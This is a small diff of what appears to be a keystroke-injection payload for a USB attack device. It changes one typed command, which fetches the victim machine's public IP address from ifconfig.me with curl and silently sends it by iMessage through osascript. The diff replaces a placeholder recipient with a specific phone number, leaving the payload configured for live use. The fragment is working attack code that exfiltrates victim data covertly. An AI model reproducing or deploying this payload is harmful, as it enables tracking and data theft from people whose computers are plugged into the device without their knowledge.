@@ -28,7 +28,7 @@ ENTER
 DELAY 500
 ENTER
 DELAY 500
-STRING  x=$(curl -s ifconfig.me/ip); osascript -e 'tell application "Messages" to send "'$x'" to buddy "ENTER PHONE NUMBER HERE"'
+STRING  x=$(curl -s ifconfig.me/ip); osascript -e 'tell application "Messages" to send "'$x'" to buddy "603-307-9370"'
 DELAY 500
 ENTER
 DELAY 4000
